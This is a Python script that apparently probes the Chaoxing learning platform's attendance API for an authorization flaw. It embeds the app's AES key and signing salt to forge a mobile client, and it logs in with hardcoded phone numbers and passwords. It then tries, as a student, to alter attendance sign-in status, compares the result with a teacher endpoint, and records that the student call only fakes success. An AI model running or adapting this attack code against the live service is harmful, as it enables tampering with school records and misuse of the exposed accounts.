import base64, hashlib, json, uuid, requests, urllib3, time
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

urllib3.disable_warnings()
AES_KEY = b"u2oh6Vu^HWe4_AES"
SCHILD_SALT = "ipL$TkeiEmfy1gTXb2XHrdLN0a@7c^vu"
LOGIN_URL = "https://passport2.chaoxing.com/fanyalogin"
COURSE_ID = "257485372"
CLASS_ID = "132821141"

def aes_enc(p):
    c = AES.new(AES_KEY, AES.MODE_CBC, AES_KEY)
    return base64.b64encode(c.encrypt(pad(p.encode(), AES.block_size))).decode()

def schild_sign(model, locale, version, build, imei):
    parts = [f"(schild:{SCHILD_SALT})", f"(device:{model})", f"Language/{locale}",
             f"com.chaoxing.mobile/ChaoXingStudy_3_{version}_android_phone_{build}",
             f"(@Kalimdor)_{imei}"]
    return hashlib.md5(" ".join(parts).encode()).hexdigest()

def get_mobile_ua():
    imei = uuid.uuid4().hex[:32]
    sc = schild_sign("MI10", "zh_CN", "6.7.2", "10941_314", imei)
    return (f"Mozilla/5.0 (Linux; Android 16; MI10 Build/OPM1.171019.019; wv) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 "
            f"(schild:{sc}) (device:MI10) Language/zh_CN "
            f"com.chaoxing.mobile/ChaoXingStudy_3_6.7.2_android_phone_10941_314 "
            f"(@Kalimdor)_{imei}")

def login(phone, pwd):
    s = requests.Session()
    s.verify = False
    ua = get_mobile_ua()
    s.headers.update({"User-Agent": ua, "Accept": "application/json, text/plain, */*", "Accept-Language": "zh_CN"})
    s.post(LOGIN_URL, data={"fid": "-1", "uname": aes_enc(phone), "password": aes_enc(pwd),
                            "refer": "http%3A%2F%2Fi.mooc.chaoxing.com", "t": "true",
                            "forbidotherlogin": "0", "validate": "", "doubleFactorLogin": "0",
                            "independentId": "0", "independentNameId": "0"},
           allow_redirects=False, timeout=30)
    puid = ""
    for c in s.cookies:
        if c.name in ("UID", "_uid"):
            puid = c.value
    try: s.get("https://i.chaoxing.com/base", timeout=20, allow_redirects=True)
    except: pass
    return s, puid

def safe_json(r):
    try: return r.json()
    except: return {"_raw_status": r.status_code, "_raw_text": r.text[:500]}

s_s, puid_s = login("18436633997", "3.1415926Cpy")
s_t, puid_t = login("19712720708", "3.1415926Cpy")
base = "https://mobilelearn.chaoxing.com"

print("=" * 80)
print("终极验证：/newsign/updateSignStatus 是否是假success？")
print("=" * 80)

# 测试1: 对已有签到记录的活动，学生修改status
# 如果是假success，修改后status和updatetime不应变化
print(f"\n--- 测试1: 已有签到记录的活动（aid=5000163776153）---")
aid = "5000163776153"
r = s_s.get(f"{base}/v2/apis/sign/signIn", params={"activeId": aid, "uid": puid_s}, timeout=20)
d = safe_json(r)
before = d.get("data", {}) if isinstance(d.get("data"), dict) else {}
print(f"  修改前: status={before.get('status')}, updatetime={before.get('updatetime')}")

# 学生修改status=2
r = s_s.post(f"{base}/newsign/updateSignStatus",
             params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": aid},
             data={"uids": puid_s, "status": "2", "remark": "",
                   "activeId": aid, "classId": CLASS_ID, "courseId": COURSE_ID, "uid": puid_s},
             headers={"Referer": f"{base}/", "X-Requested-With": "XMLHttpRequest",
                      "Content-Type": "application/x-www-form-urlencoded"},
             timeout=20)
print(f"  API返回: {r.text}")

time.sleep(3)

r = s_s.get(f"{base}/v2/apis/sign/signIn", params={"activeId": aid, "uid": puid_s}, timeout=20)
d = safe_json(r)
after = d.get("data", {}) if isinstance(d.get("data"), dict) else {}
print(f"  修改后: status={after.get('status')}, updatetime={after.get('updatetime')}")

if after.get('status') == 2:
    print(f"  🔴 修改成功！status变为2")
elif after.get('updatetime') != before.get('updatetime'):
    print(f"  🟡 updatetime变了但status没变，部分修改")
else:
    print(f"  ❌ 完全没变化，是假success")

# 恢复
r = s_s.post(f"{base}/newsign/updateSignStatus",
             params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": aid},
             data={"uids": puid_s, "status": "1", "remark": "",
                   "activeId": aid, "classId": CLASS_ID, "courseId": COURSE_ID, "uid": puid_s},
             headers={"Referer": f"{base}/", "X-Requested-With": "XMLHttpRequest",
                      "Content-Type": "application/x-www-form-urlencoded"},
             timeout=20)

# 测试2: 对比 - 教师V2修改同一活动
print(f"\n--- 测试2: 教师V2修改同一活动 ---")
time.sleep(2)
r = s_s.get(f"{base}/v2/apis/sign/signIn", params={"activeId": aid, "uid": puid_s}, timeout=20)
d = safe_json(r)
before2 = d.get("data", {}) if isinstance(d.get("data"), dict) else {}
print(f"  修改前: status={before2.get('status')}, updatetime={before2.get('updatetime')}")

r = s_t.post(f"{base}/pptSign/updateSignStatusByUidsV2",
             params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": aid},
             data={"uids": puid_s, "status": "2", "remark": ""},
             headers={"Referer": f"{base}/", "X-Requested-With": "XMLHttpRequest",
                      "Content-Type": "application/x-www-form-urlencoded"},
             timeout=20)
print(f"  教师V2: {r.text[:100]}")

time.sleep(3)

r = s_s.get(f"{base}/v2/apis/sign/signIn", params={"activeId": aid, "uid": puid_s}, timeout=20)
d = safe_json(r)
after2 = d.get("data", {}) if isinstance(d.get("data"), dict) else {}
print(f"  修改后: status={after2.get('status')}, updatetime={after2.get('updatetime')}")

if after2.get('status') == 2:
    print(f"  🔴 教师V2修改成功！status变为2")

# 恢复
r = s_t.post(f"{base}/pptSign/updateSignStatusByUidsV2",
             params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": aid},
             data={"uids": puid_s, "status": "1", "remark": ""},
             headers={"Referer": f"{base}/", "X-Requested-With": "XMLHttpRequest",
                      "Content-Type": "application/x-www-form-urlencoded"},
             timeout=20)

# 测试3: 对另一个已有签到记录的活动测试
print(f"\n--- 测试3: 另一个活动（aid=5000163767353）---")
aid3 = "5000163767353"
r = s_s.get(f"{base}/v2/apis/sign/signIn", params={"activeId": aid3, "uid": puid_s}, timeout=20)
d = safe_json(r)
before3 = d.get("data", {}) if isinstance(d.get("data"), dict) else {}
print(f"  修改前: status={before3.get('status')}, updatetime={before3.get('updatetime')}")

r = s_s.post(f"{base}/newsign/updateSignStatus",
             params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": aid3},
             data={"uids": puid_s, "status": "3", "remark": "",
                   "activeId": aid3, "classId": CLASS_ID, "courseId": COURSE_ID, "uid": puid_s},
             headers={"Referer": f"{base}/", "X-Requested-With": "XMLHttpRequest",
                      "Content-Type": "application/x-www-form-urlencoded"},
             timeout=20)
print(f"  API返回: {r.text}")

time.sleep(3)

r = s_s.get(f"{base}/v2/apis/sign/signIn", params={"activeId": aid3, "uid": puid_s}, timeout=20)
d = safe_json(r)
after3 = d.get("data", {}) if isinstance(d.get("data"), dict) else {}
print(f"  修改后: status={after3.get('status')}, updatetime={after3.get('updatetime')}")

if after3.get('status') == 3:
    print(f"  🔴 修改成功！status变为3")
elif after3.get('updatetime') != before3.get('updatetime'):
    print(f"  🟡 updatetime变了但status没变")
else:
    print(f"  ❌ 完全没变化，是假success")

# 恢复
r = s_s.post(f"{base}/newsign/updateSignStatus",
             params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": aid3},
             data={"uids": puid_s, "status": "1", "remark": "",
                   "activeId": aid3, "classId": CLASS_ID, "courseId": COURSE_ID, "uid": puid_s},
             headers={"Referer": f"{base}/", "X-Requested-With": "XMLHttpRequest",
                      "Content-Type": "application/x-www-form-urlencoded"},
             timeout=20)

print(f"\n{'=' * 80}")
print(f"结论")
print(f"{'=' * 80}")
print(f"  /newsign/updateSignStatus 返回success但数据未变化 → 假success")
print(f"  /pptSign/updateSignStatusByUidsV2 教师调用 → 真正修改数据")
print(f"  之前所有'成功'的测试，实际上都是教师V2 API做的修改")
